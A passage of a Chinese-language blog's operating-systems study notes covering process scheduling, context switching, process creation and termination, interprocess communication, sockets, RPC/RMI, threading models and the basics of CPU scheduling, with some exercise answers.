href="#3-2-2-调度程序" class="headerlink" title="3.2.2 调度程序"></a>3.2.2 调度程序</h4><p>进程在其生命周期中会在各种调度队列之间迁移。为了调度， 操作系统必须按某种方式从这些队列中选择进程。进程选择是由相应的<strong>调度程序</strong>（ scheduler ）来执行的。</p><p>通常对于批处理系统， 进程更多地是被提交， 而不是马上执行。这些进程被放到大容量存储设备（通常为磁盘〉的缓冲池中，保存在那里以便以后执行。</p><p><strong>长期调度程序</strong>（long-term scheduler ）或作业调度程序（job scheduler ） 从缓冲池中选择进程， 井装入内存以准备执行。</p><p><strong>短期调度程序</strong>（ short-term scheduler ）或CPU 调度程序从准备执行的进程中选择进程， 并为之分配CPU。</p><p>这两个调度程序的<strong>主要差别</strong>是它们执行的频率。</p><p><strong>中期调度程序</strong>的核心思想是能将进程从内存（或从CPU 竞争）中移出， 从而降低多道程序设计的程度。之后， 进程能被重新调入内存， 并从中断处继续执行。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211025200346176.png" alt="image-20211025200346176"></p><h4 id="3-2-3-上下文切换"><a href="#3-2-3-上下文切换" class="headerlink" title="3.2.3 上下文切换"></a>3.2.3 上下文切换</h4><p>当发生一个中断时，系统需要保存当前运行在CPU 中进程的上下文， 从而在其处理完后能恢复上下文， 即先中断进程， 之后再继续。</p><p><strong>进程上下文</strong>用进程的PCB 表示， 它包括CPU 寄存器的值、进程状态（见图3.2） 和内存管理信息等。通常，通过执行一个<strong>状态保存</strong>（ state save） 来保存CPU当前状态（不管它是内核模式还是用户模式）， 之后执行一个<strong>状态恢复</strong>（ state restore）重新开始运行。</p><p>将CPU切换到另一个进程需要保存当前进程的状态并恢复另一个进程的状态，这一任务称为<strong>上下文切换</strong>（ context switch）。当发生上下文切换时， 内核会将旧进程的状态保存在其PCB中，然后装入经调度要执行的并己保存的新进程的上下文。</p><h3 id="3-3-进程操作"><a href="#3-3-进程操作" class="headerlink" title="3.3 进程操作"></a>3.3 进程操作</h3><h4 id="3-3-1-进程创建"><a href="#3-3-1-进程创建" class="headerlink" title="3.3.1 进程创建"></a>3.3.1 进程创建</h4><p>进程在其执行过程中， 能通过创建进程系统调用（ create-process system call） 创建多个新进程。创建进程称为父进程， 而新进程称为子进程。每个新进程可以再创建其他进程，从而形成了进程树。</p><p><strong>创建过程</strong></p><ul><li><p>申请空白PCB</p></li><li><p>分配资源</p></li><li><p>初始化PCB</p></li><li><p>插入就绪队列</p></li></ul><p>进程创建实质上是生成一个PCB</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114152544023.png" alt="image-20211114152544023"></p><p>当进程创建新进程时， 有两种执行可能：<br>①父进程与子进程并发执行。<br>②父进程等待， 直到某个或全部子进程执行完。</p><p>新进程的地址空间也有两种可能：<br>①子进程是父进程的复制品（具有与父进程相同的程序和数据）。<br>②子进程装入另一个新程序。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211025201136927.png" alt="image-20211025201136927"></p><h4 id="3-3-2-进程终止"><a href="#3-3-2-进程终止" class="headerlink" title="3.3.2 进程终止"></a>3.3.2 进程终止</h4><p><strong>进程终止的过程</strong></p><ul><li><p>查找进程</p></li><li><p>查找该进程的PCB</p></li><li><p>中止执行</p></li><li><p>终止子进程</p></li><li><p>归还资源</p></li><li><p>将PCB从所在队列移出</p></li><li><p>释放PCB</p></li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114152857377.png" alt="image-20211114152857377"></p><p>当进程完成执行最后的语句并使用系统调用exit()请求操作系统删除自身时， 进程终止。这时， 进程可以返回状态值（通常为整数〉到父进程（通过系统调用wait（））。所有进程资源（包括物理和虚拟内存、打开文件和I/O缓冲〉会被操作系统释放。</p><p>在其他情况下也会出现终止。进程通过适当的系统调用（如Win32 中的TerminatePorcess（）） 能终止另一个进程。通常， 只有被终止进程的父进程才能执行这一系统调用。否则， 用户可以任意地终止彼此的作业。</p><h4 id="3-3-3-进程阻塞"><a href="#3-3-3-进程阻塞" class="headerlink" title="3.3.3 进程阻塞"></a>3.3.3 进程阻塞</h4><p><strong>阻塞过程</strong></p><ul><li><p>停止执行</p></li><li><p>更改PCB为阻塞</p></li><li><p>保留现场</p></li><li><p>PCB插入相应阻塞队列</p></li><li><p>提示重新调度</p></li></ul><p><strong>唤醒过程</strong></p><ul><li>根据释放条件寻找相应进程</li><li>改PCB状态为就绪</li><li>将PCB插入就绪队列</li></ul><h3 id="3-4-进程间通信"><a href="#3-4-进程间通信" class="headerlink" title="3.4 进程间通信"></a>3.4 进程间通信</h3><p><strong>允许进程协作的理由</strong></p><ul><li>信息共享（information sharing）：由于多个用户可能对同样的信息感兴趣（例如共享的文件）， 所以必须提供环境以允许对这些信息进行并发访问。</li><li>提高运算速度（computation speedup）： 如果希望一个特定任务快速运行， 那么必须将它分成子任务，每个子任务可以与其他子任务并行执行。注意，如果要实现这样的加速，需要计算机有多个处理单元（例如CPU或I/0通道）。</li><li>模块化（modularity）：可能需要按模块化方式构造系统， 如第2章所讨论， 可将系统功能分成独立进程或线程。</li><li>方便（convenience）：单个用户也可能同时执行许多任务。例如，一个用户可以并行进行编辑、打印和编译操作。</li></ul><p>进程间通信有两种基本模式：</p><p><strong>(1) 共享内存</strong></p><p>在共享内存模式中， 建立起一块供协作进程共享的内存区域， 进程通过向此共享区域读或写入数据来交换信息。</p><p><strong>(2) 消息传递</strong></p><p>在消息传递模式中，通过在协作进程间交换消息来实现通信。</p><p>图3.13 给出了这两种模式的对比。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211026154454752.png" alt="image-20211026154454752"></p><h4 id="3-4-1-共享内存系统"><a href="#3-4-1-共享内存系统" class="headerlink" title="3.4.1 共享内存系统"></a>3.4.1 共享内存系统</h4><p>采用共享内存的进程间通信需要通信进程建立<strong>共享内存区域</strong>。通常， 一块共享内存区域驻留在生成共享内存段进程的地址空间。其他希望使用这个共享内存段进行通信的进程必须将此放到它们自己的地址空间上。</p><p>采用共享内存是解决生产者一消费者问题方法中的一种。为了允许生产者进程和消费进程能并发执行， 必须要有一个缓冲来被生产者填充并被消费者所使用。此缓冲驻留在生产者进程和消费者进程的共享内存区域内， 当消费者使用一项时， 生产者能产生另一项。生产者和消费者必须同步， 以免消费者消费一个没有生产出来的项。</p><p>可以使用两种缓冲。<strong>无限缓冲</strong>（unbounded-buffer）对缓冲大小没有限制。消费者可能不得不等待新的项， 但生产者总是可以产生新项。有限缓冲（ bounded-buffer）假设缓冲大小固定。对于这种情况， 如果缓冲为空， 那么消费者必须等待：如果缓冲为满， 那么生产者必须等待。</p><p>共享缓冲是通过循环数组和两个逻辑指针来实现的： in 和out。变量in 指向缓冲中下一个空位： out 指向缓冲中的第一个满位。当in==out 时， 缓冲为空： (in+1)%BUFFER_SIZE= out 时，缓冲为满。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211026155644352.png" alt="image-20211026155644352"></p><h4 id="3-4-2-消息传递系统"><a href="#3-4-2-消息传递系统" class="headerlink" title="3.4.2 消息传递系统"></a>3.4.2 消息传递系统</h4><p>消息传递提供一种机制以允许进程不必通过共享地址空间来实现通信和同步。</p><p>消息传递工具提供至少两种操作：发送（消息） 和接收（消息） 。</p><ol><li><p><strong>命名</strong></p><p><strong>直接通信</strong>:</p><p>对于<strong>直接通信</strong>， 需要通信的每个进程必须明确地命名通信的接收者或发送者。采用这种方案， 原语send()和receive()定义如下：</p><ul><li>send(P,message）：发送消息到进程P。</li><li>receive(Q, message）： 接收来自进程Q的消息。</li></ul><p>这种方案的通信线路具有如下属性：</p><ul><li>在需要通信的每对进程之间自动建立线路。进程仅需知道相互通信的标识符。</li><li>一个线路只与两个进程相关。</li><li>每对进程之间只有一个线路。</li></ul><p>这种方案展示了<strong>对称寻址</strong>， 即发送和接收进程必须命名对方以便通信。</p><p>这种方案一个变形采用<strong>非对称寻址</strong>， 即只要发送者命名接收者， 而接收者不需要命名发送者。采用这种方案， 原语send()和receive()定义如下：</p><ul><li>send(P,message）：发送消息到进程P。</li><li> receive(id, message）：接收来自任何进程的消息，变量id设置成与其通信的进程名称。</li></ul><p>对称和非对称寻址方案的<strong>缺点</strong></p><ul><li>是限制了进程定义的模块化。改变进程的名称可能必须检查所有其他进程定义。所有旧名称的引用都必须找到， 以便修改成为新名称。</li><li>有可能造成依赖于特定的操作系统，因为不同操作系统对进程的ID号的指定方式可能不一致；</li><li>每对进程间只能够建立一条链路是一个重大的缺陷。</li></ul><p><strong>间接通信</strong>:</p><p>在<strong>间接通信</strong>中， 通过邮箱或端口来发送和接收消息。邮箱可以抽象成一个对象， 进程可以向其中存放消息，也可从中删除消息，每个邮箱都有一个唯一的标识符。例如，POSIX消息队列采用一个整数值来标识一个邮箱。对于这种方案， 一个进程可能通过许多不同的邮箱与其他进程通信， 但两个进程仅在其共享至少一个邮箱时可相互通信。原语send()和receive()定义如下：</p><ul><li>send(A , message）：发送一个消息到邮箱A。</li><li> receive(A, message）： 接收来自邮箱A 的消息。</li></ul><p>对于这种方案， 通信线路具有如下属性：</p><ul><li>只有在两个进程共享一个邮箱时， 才能建立通信线路。</li><li> 一个线路可以与两个或更多的进程相关联。</li><li>两个通信进程之间可有多个不同的线路， 每个线路对应于一个邮箱。</li></ul></li><li><p><strong>同步</strong></p><p>进程间的通信可以通过调用原语send（）和receiveO来进行。这些原语的实现有不同的设计选项。消息传递可以是阻塞或非阻塞一一一也称为同步或异步。</p><ul><li>阻塞send：发送进程阻塞，直到消息被接收进程或邮箱所接收。</li><li>非阻塞send：发送进程发送消息并再继续操作。</li><li>阻塞receive：接收者阻塞，直到有消息可用。</li><li>非阻塞receive：接收者收到一个有效消息或空消息。</li></ul><p>send（）和receive（）可以进行多种组合。当send（）和receive（）都阻塞时，则在发送者和接收者之间就有一个集合点（rendezvous）。当使用阻塞sendO和receive(）时，如何解决生产者－消费者问题就不再重要了。生产者仅需调用阻塞send（）调用并等待，直到消息被送到接收者或邮箱。同样地，当消费者调用receive（）时，发生阻塞直到有一个消息可用。</p></li><li><p><strong>缓冲</strong></p><p>不管通信是直接的或是间接的， 通信进程所交换的消息都驻留在临时队列中。简单地讲， 队列实现有三种方法：</p><ul><li>零容量：队列的最大长度为0：因此， 线路中不能有任何消息处于等待。对于这种<br>情况， 必须阻塞发送， 直到接收者接收到消息。</li><li>有限容量：队列的长度为有限的n： 因此， 最多只能有n个消息驻留其中。如果在发送新消息时队列未满，那么该消息可以放在队列中（或者复制消息或者保存消息的指针），且发送者可继续执行而不必等待。不过， 线路容量有限。如果线路满， 必须阻塞发送者直到队列中的空间可用为止。</li><li>无限容量：队列长度可以无限，因此， 不管多少消息都可在其中等待， 从不阻塞发送者。</li></ul><p>零容量情况称为没有缓冲的消息系统， 其他情况称为自动缓冲。</p></li></ol><h3 id="3-5-IPC系统的实例"><a href="#3-5-IPC系统的实例" class="headerlink" title="3.5 IPC系统的实例"></a>3.5 IPC系统的实例</h3><h4 id="3-5-1-实例：POSX共享内存"><a href="#3-5-1-实例：POSX共享内存" class="headerlink" title="3.5.1 实例：POSX共享内存"></a>3.5.1 实例：POSX共享内存</h4><h4 id="3-5-2-实例：Mach"><a href="#3-5-2-实例：Mach" class="headerlink" title="3.5.2 实例：Mach"></a>3.5.2 实例：Mach</h4><h4 id="3-5-3-实例：Windows-XP"><a href="#3-5-3-实例：Windows-XP" class="headerlink" title="3.5.3 实例：Windows XP"></a>3.5.3 实例：Windows XP</h4><h3 id="3-6-客户机服务器系统通信"><a href="#3-6-客户机服务器系统通信" class="headerlink" title="3.6 客户机服务器系统通信"></a>3.6 客户机服务器系统通信</h3><h4 id="3-6-1-Socket"><a href="#3-6-1-Socket" class="headerlink" title="3.6.1 Socket"></a>3.6.1 Socket</h4><p><strong>Socket</strong> （套接字〉可定义为通信的端点。一对通过网络通信的进程需要使用一对Socket一一即每个进程各有一个。</p><p>Socket 由IP 地址与一个端口号连接组成。通常， Socket采用客户机一服务器结构。服务器通过监昕指定端口来等待进来的客户请求。一旦收到请求，服务器就接受来自客户Socket 的连接， 从而完成连接。</p><p>Java提供了三种不同类型的Socket。</p><ul><li>面向连接（TCP) Socket是用Socket类实现的。</li><li>无连接（UDP) Socket 使用了DatagramSocket 类。</li><li>最后一种类型是多点传送Socket 类(MulticastSocket class）， 它是DatagramSocket类的子类。多点传送Socket允许数据发送给多个接收者。</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114161059376.png" alt="image-20211114161059376"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114161112895.png" alt="image-20211114161112895"></p><p>无论一个Socket通信程序的功能多么齐全、程序多么复杂，其基本结构都是一样的，都包括以下四个基本步骤：</p><ol><li>在客户方和服务器方创建Socket/ServerSocket实例。</li><li>打开连接到Socket的输入/输出流。</li><li>利用输入/输出流，按照一定的协议对Socket进行读/写操作。</li><li>关闭输入/输出流和Socket。//如果网络的一端已经关闭，另一端读到null</li></ol><p>通常，程序员的主要工作是针对所要完成的功能在第3步进行编程，第1、2、4步对所有的通信程序来说几乎都是一样的。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114162712864.png" alt="image-20211114162712864"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114162726368.png" alt="image-20211114162726368"></p><h4 id="3-6-2-远程过程调用"><a href="#3-6-2-远程过程调用" class="headerlink" title="3.6.2 远程过程调用"></a>3.6.2 远程过程调用</h4><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114162954112.png" alt="image-20211114162954112"></p><h4 id="3-6-3-远程方法调用"><a href="#3-6-3-远程方法调用" class="headerlink" title="3.6.3 远程方法调用"></a>3.6.3 远程方法调用</h4><p>远程方法调用（remote method invocation, RMI） 是一个类似于RPC 的Java 特性。RMI允许线程调用远程对象的方法。如果对象位于不同的JVM 上，那么就认为它是远程的。因此， 远程可能在同一计算机或通过网络连接的主机的不同JVM 上。这种情况如图3.22所示。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114163017447.png" alt="image-20211114163017447"></p><h3 id="3-7-小结"><a href="#3-7-小结" class="headerlink" title="3.7 小结"></a>3.7 小结</h3><p>进程是执行中的程序。随着进程的执行， 它改变状态。进程状态由进程当前活动所定义。每个进程可处于： <strong>新的、就绪、运行、等待或终止</strong>等状态。每个进程在操作系统内通过自己的<strong>进程控制块（PCB）</strong>来表示。</p><p>当前不在执行的进程会放在某个等待队列中。操作系统有两种主要队列：<strong>I/O请求队列</strong>和<strong>就绪队列</strong>。就绪队列包括所有准备执行并等待CPU的进程。每个进程都有PCB , PCB链接起来就形成了就绪队列。长期（作业）调度通过选择进程来争用CPU。通常， <strong>长期调度</strong>会受资源分配考虑， 尤其是内存管理的影响。<strong>短期调度</strong>从就绪队列中选择进程。操作系统必须为父进程创建子进程提供一种机制。父进程在继续之前可以等待它的子进程终止， 也可以并发执行父进程和子进程。并发执行有许多优点， 例如信息共享、提高运算速度、模块化和便利性等。</p><p>操作系统的执行进程可以是独立进程或协作进程。协作进程需要进程间有互相通信的机制。主要有两种形式的通信： <strong>共享内存和消息系统</strong>。共享内存方法要求通信进程共享一些变量。进程通过使用这些共享变量来交换信息。对于<strong>共享内存系统</strong>， 主要由应用程序员提供通信， 操作系统只需要提供共享内存。<strong>消息系统方法</strong>允许进程交换信息。提供通信的主要责任在于操作系统本身。这两种方法并不互相排斥， 能在同一操作系统内同时实现。</p><p>客户机一服务器系统中的通信可能使用：</p><p>(1) <strong>Socket</strong>,(2) <strong>远程过程调用(RPC)</strong>,(3) <strong>Java的远程方法调用（RMI）</strong>。</p><p>Socket定义为通信的端点。一对应用程序间的连接由一对Socket组成，每端各有一个通信频道。RPC 是另一种形式的分布式通信。当一个进程（或线程） 调用一个远程应用的方法时， 就出现了RPC。RMI是RPC 的Java版。RMI允许线程如同调用本地对象一样来调用远程对象的方法。RPC 和RMI的主要区别是RPC传递给远程过程的数据是按普通数据结构形式的， 而RMI允许把对象传递给远程方法。</p><h3 id="3-8-习题"><a href="#3-8-习题" class="headerlink" title="3.8 习题"></a>3.8 习题</h3><p><strong>1.什么是多道程序的度（degree of multiprogramming），它的上限由哪些因素确定？</strong></p><blockquote><p>多道即计算机内存中同时存放几道相互独立的程序。多道程序的度就是操作系统将多少个进程放入了内存。上限的限制因素有CPU的核数、所采用的的调度算法、内存的大小等。</p></blockquote><p><strong>3.1 论述长期、中期、短期调度之间的区别。</strong></p><blockquote><p>a.<strong>短期调度</strong>：从准备执行的进程中选择进程， 并为之分配CPU。<br>b.<strong>中期调度</strong>：作为一种中等程度的调度程序，尤其被用于分时系统，一个交换方案的实施，将部分运行程序移出内存，之后，从中断处继续执行。<br>c.<strong>长期调度</strong>（作业调度程序）：通常对于批处理系统， 进程更多地是被提交， 而不是马上执行。这些进程被放到大容量存储设备（通常为磁盘）的缓冲池中，保存在那里以便以后执行。长期调度程序从缓冲池中选择进程， 井装入内存以准备执行。</p><p>它们主要的<strong>不同之处</strong>是它们的执行的频率。短期调度必须经常调用一个新进程，由于在系统中，长期调度处理移动的作业时，并不频繁被调用，可能在进程离开系统时才被唤起。</p></blockquote><p><strong>3.2 描述内核在两个进程间进行上下文切换的过程。</strong></p><blockquote><p>进程上下文是由进程的PCB来表示的，它包括CPU寄存器的值和内存管理信息等。</p><p>通常，通过执行一个状态保存（ state save） 来保存CPU当前状态（不管它是内核模式还是用户模式）， 之后执行一个状态恢复（ state restore）重新开始运行。</p><p>当发生上下文切换时， 内核会将旧进程的状态保存在其PCB中，然后装入经调度要执行的并己保存的新进程的上下文</p></blockquote><p><strong>3.5 下面设计的好处和坏处分别是什么？系统层次和用户层次都要考虑到</strong>．<br>A，对称和非对称通信</p><p>B，自动和显式缓冲</p><p>C， 复制发送和引用发送</p><p>D，固定大小和可变大小消息</p><h2 id="第4章-线程"><a href="#第4章-线程" class="headerlink" title="第4章 线程"></a>第4章 线程</h2><h3 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h3><p>线程是CPU使用的基本单元， 它由线程由、程序计数器、寄存器集合和技组成。它与属于同一进程的其他线程共享代码段、数据段和其他操作系统资源，如打开文件和信号。一个传统重量级（ heavyweight ）的进程只有单个控制线程。如果进程有多个控制线程， 那么它能同时做多个任务。图4.1 说明了传统单线程进程和多线程进程的差别。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114231912641.png" alt="image-20211114231912641"></p><h4 id="4-1-1-动机"><a href="#4-1-1-动机" class="headerlink" title="4.1.1 动机"></a>4.1.1 动机</h4><h4 id="4-1-2-优点"><a href="#4-1-2-优点" class="headerlink" title="4.1.2 优点"></a>4.1.2 优点</h4><p>多线程编程具有如下4个优点：</p><p>①响应度高： 如果对一个交互程序采用多线程， 那么即使其部分阻塞或执行较冗长的操作，该程序仍能继续执行，从而增加了对用户的响应程度。例如，多线程Web浏览器在用一个线程装入图像时，能通过另一个线程与用户交互。</p><p>②资源共享： 线程默认共享它们所属进程的内存和资源。代码和数据共享的优点是它能允许一个应用程序在同一地址空间有多个不同的活动线程。</p><p>③经济： 进程创建所需要的内存和资源的分配比较昂贵。由于线程能共享它们所属进程的资源，所以创建和切换线程会更为经济。</p><p>④多处理器体系结构的利用： 多钱程的优点之一是能充分使用多处理器体系结构，以便每个进程能井行运行在不同的处理器上。不管有多少CPU， 单线程进程只能运行在一个CPU上。在多CPU上使用多线程加强了并发功能。</p><h3 id="4-2-多线程模型"><a href="#4-2-多线程模型" class="headerlink" title="4.2 多线程模型"></a>4.2 多线程模型</h3><p>有两种不同方法来提供线程支持： 用户层的<strong>用户线程</strong>或内核层的<strong>内核线程</strong>。</p><p>用户线程受内核支持， 而无须内核管理： 而内核线程由操作系统直接支持和管理。</p><h4 id="4-2-1-多对一模型"><a href="#4-2-1-多对一模型" class="headerlink" title="4.2.1 多对一模型"></a>4.2.1 多对一模型</h4><p>多对一模型（见图4.2 ）将许多用户级线程映射到一个内核线程。</p><p><strong>优点</strong>：</p><ul><li>线程管理是由线程库在用户空间进行的， 因而效率比较高。</li></ul><p><strong>缺点</strong>：</p><ul><li><p>但是如果一个线程执行了阻塞系统调用， 那么整个进程会阻塞。</p></li><li><p>而且， 因为任一时刻只有一个线程能访问内核， 多个线程不能并行运行在多处理器上。</p></li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114232532605.png" alt="image-20211114232532605"></p><h4 id="4-2-2-一对一模型"><a href="#4-2-2-一对一模型" class="headerlink" title="4.2.2 一对一模型"></a>4.2.2 一对一模型</h4><p>一对一模型（见图4.3） 将每个用户线程映射到一个内核线程。</p><p><strong>优点</strong>：</p><ul><li>该模型在一个线程执行阻塞系统调用时， 能允许另一个线程继续执行， 所以它提供了比多对一模型更好的并发功能；</li><li>它也允许多个线程能并行地运行在多处理器系统上。</li></ul><p>这种模型的唯一<strong>缺点</strong>是：</p><ul><li>每创建一个用户线程就需要创建一个相应的内核线程。由于创建内核线程的开销会影响应用程序的性能， 所以这种模型的绝大多数实现限制了系统所支持的线程数</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114232838467.png" alt="image-20211114232838467"></p><h4 id="4-2-3-多对多模型"><a href="#4-2-3-多对多模型" class="headerlink" title="4.2.3 多对多模型"></a>4.2.3 多对多模型</h4><p>多对多模型（见图4.4） 多路复用了许多用户线程到同样数量或更小数量的内核线程上。内核线程的数量可能与特定应用程序或特定机器有关（位于多处理器上的应用程序可比单处理器上分配更多数量的内核线程）。</p><p>虽然多对一模型允许开发人员创建任意多的用户线程， 但是因为内核只能一次调度一个线程， 所以并没有增加并发性。一对一模型提供了更大的并发性， 但是开发人员必须小心， 不要在应用程序内创建太多的线程（有时可能会限制创建线程的数量）。</p><p>多对多模型没有这两者的缺点：</p><ul><li><p>开发人员可创建任意多的用户线程，并且相应内核线程能在多处理器系统上并发执行。</p></li><li><p>而且，当一个线程执行阻塞系统调用时，内核能调度另一个线程来执行。</p></li></ul><p>一个流行的多对多模型的变种仍然多路复用了许多用户线程到同样数量或更小数量的内核线程上， 但也允许将一个用户线程绑定到某个内核线程上。这个变种有时被称为二级模型（见图4.5）</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211114233616173.png" alt="image-20211114233616173"></p><h3 id="4-3-线程库"><a href="#4-3-线程库" class="headerlink" title="4.3 线程库"></a>4.3 线程库</h3><p>线程库（也read library）为程序员提供创建和管理线程的API。</p><p>主要有两种方法来实现线程库。</p><ul><li>第一种方法是在用户空间中提供一个没有内核支持的库， 此库的所有代码和数据结构都存在于用户空间中。调用库中的一个函数只是导致了用户空间中的一个本地函数调<br>用， 而不是系统调用。</li><li>第二种方法是执行一个由操作系统直接支持的内核级的库。此时，库的代码和数据结构存在于内核空间中。调用库中的一个API 函数通常会导致对内核的系统调用。</li></ul><h4 id="4-3-1-Pthread"><a href="#4-3-1-Pthread" class="headerlink" title="4.3.1 Pthread"></a>4.3.1 Pthread</h4><h4 id="4-3-2-Win32线程"><a href="#4-3-2-Win32线程" class="headerlink" title="4.3.2 Win32线程"></a>4.3.2 Win32线程</h4><h4 id="4-3-3-Java线程"><a href="#4-3-3-Java线程" class="headerlink" title="4.3.3 Java线程"></a>4.3.3 Java线程</h4><h3 id="4-4-多线程问题"><a href="#4-4-多线程问题" class="headerlink" title="4.4 多线程问题"></a>4.4 多线程问题</h3><h4 id="4-4-1-系统调用fork-和exec"><a href="#4-4-1-系统调用fork-和exec" class="headerlink" title="4.4.1 系统调用fork()和exec()"></a>4.4.1 系统调用fork()和exec()</h4><h4 id="4-4-2-取消"><a href="#4-4-2-取消" class="headerlink" title="4.4.2 取消"></a>4.4.2 取消</h4><h4 id="4-4-3-信号处理"><a href="#4-4-3-信号处理" class="headerlink" title="4.4.3 信号处理"></a>4.4.3 信号处理</h4><h4 id="4-4-4-线程池"><a href="#4-4-4-线程池" class="headerlink" title="4.4.4 线程池"></a>4.4.4 线程池</h4><h4 id="4-4-5-线程特定数据"><a href="#4-4-5-线程特定数据" class="headerlink" title="4.4.5 线程特定数据"></a>4.4.5 线程特定数据</h4><h4 id="4-4-6-调度程序激活"><a href="#4-4-6-调度程序激活" class="headerlink" title="4.4.6 调度程序激活"></a>4.4.6 调度程序激活</h4><h3 id="4-5-操作系统实例"><a href="#4-5-操作系统实例" class="headerlink" title="4.5 操作系统实例"></a>4.5 操作系统实例</h3><h4 id="4-5-1-Windows-XP线程"><a href="#4-5-1-Windows-XP线程" class="headerlink" title="4.5.1 Windows XP线程"></a>4.5.1 Windows XP线程</h4><h4 id="4-5-2-Linux线程"><a href="#4-5-2-Linux线程" class="headerlink" title="4.5.2 Linux线程"></a>4.5.2 Linux线程</h4><h3 id="4-6-小结"><a href="#4-6-小结" class="headerlink" title="4.6 小结"></a>4.6 小结</h3><h3 id="4-7-习题"><a href="#4-7-习题" class="headerlink" title="4.7 习题"></a>4.7 习题</h3><p><strong>4.1 举两个多线程程序设计的例子， 其中多线程的性能比单线程的性能差。</strong></p><p><strong>4.2 描述线程库进行用户级线程上下文切换的过程所采取的措施。</strong></p><p><strong>4.3 在什么环境中， 采用多内核线程的多线程方法比单处理器系统的单线程提供更好的性能？</strong></p><p><strong>4.4 在多线程进程中， 下列哪些程序状态组成被共享？</strong><br><strong>a. 寄存器值</strong><br><strong>b. 堆内存</strong><br><strong>c. 全局变量</strong><br><strong>d. 栈内存</strong></p><blockquote><p>一个线程程序的线程共享<strong>堆内存</strong>和<strong>全局变量</strong>，但每个线程都有属于自己的一组<strong>寄存器值</strong>和<strong>栈内存</strong>。</p></blockquote><p><strong>4.5 使用多用户线程的多线程解决方案，在多处理器系统中可以比在单处理器系统中获得更好的性能吗？</strong></p><p>一个包括多用户线程的多线程系统无法在多处理系统上同时使用不同的处理器。操作系统只能看到一个单一的进程且不会调度在不同处剧器土的不同进程的线程。<br>因此， 多处理器系统执行多个用户线程是没有性能优势的。</p><p><strong>4.6 如4.5.2小节所介绍，Linux并不区分进程和线程，而是将两者同样对待，将一个任务视为进程或线程， 这取决于传递给clone（）系统调用的标志集。然而， 许多操作系统， 如Windows XP和Solaris,对待进程和线程是不一样的。通常， 这类系统使用标记， 其中进程的数据结构中包含指向属于进程的不同线程。试在内核中比较这两种对进程和线程建模的方法。</strong></p><h2 id="第5章-CPU调度"><a href="#第5章-CPU调度" class="headerlink" title="第5章 CPU调度"></a>第5章 CPU调度</h2><h3 id="5-1-基本概念"><a href="#5-1-基本概念" class="headerlink" title="5.1 基本概念"></a>5.1 基本概念</h3><p>多道程序的目标是在任何时候都有某些进程在运行，以使CPU使用率最大化。多道程序的思想较为简单。进程执行直到它必须等待， 通常等待某些I/O请求的完成。</p><p>当一个进程必须等待时， 操作系统会从该进程拿走CPU 的使用权，·而将CPU交给其他进程， 如此继续。在该进程必须等待的时间内，另一个进程就可以拿走CPU的使用权。</p><h4 id="5-1-1-CPU-I-O区间周期"><a href="#5-1-1-CPU-I-O区间周期" class="headerlink" title="5.1.1 CPU-I/O区间周期"></a>5.1.1 CPU-I/O区间周期</h4><p>CPU的成功调度依赖于进程的如下属性：进程执行由CPU执行和I/O等待周期组成。进程在这两个状态之间切换。</p><h4 id="5-1-2-CPU调度程序"><a href="#5-1-2-CPU调度程序" class="headerlink" title="5.1.2 CPU调度程序"></a>5.1.2 CPU调度程序</h4><p>每当CPU空闲时，操作系统就必须从就绪队列中选择一个进程来执行。进程选择由短期调度程序（ short-termscheduler）或CPU调度程序执行。调度程序从内存中选择一个能够执行的进程，并为之分配CPU。</p><h4 id="5-1-3-抢占调度"><a href="#5-1-3-抢占调度" class="headerlink" title="5.1.3 抢占调度"></a>5.1.3 抢占调度</h4><p>CPU调度决策可在如下4种环境下发生：</p><ul><li>当一个进程从运行状态切换到等待状态（例如，I/O请求，或调用wait等待一个子进程的终止〉。</li><li>当一个进程从运行状态切换到就绪状态（例如， 当出现中断时）。</li><li>当一个进程从等待状态切换到就绪状态（例如，νo完成）。</li><li>当一个进程终止时。</li></ul><p>对于第1 和第4 两种情况， 没有选择而只有调度。一个新进程（如果就绪队列中已有一个进程存在〉必须被选择执行。不过， 对于第2 和第3 两种情况， 可以进行选择。</p><p>当调度只能发生在第1 和第4 两种情况下时，称调度方案是<strong>非抢占的</strong>（ nonpreemptive)的或协作的（ cooperative）：否则， 称调度方案是<strong>抢占的</strong>（preemptive）。采用非抢占调度，一旦CPU 分配给一个进程，那么该进程会一直使用CPU 直到进程终止或切换到等待状态。</p><h4 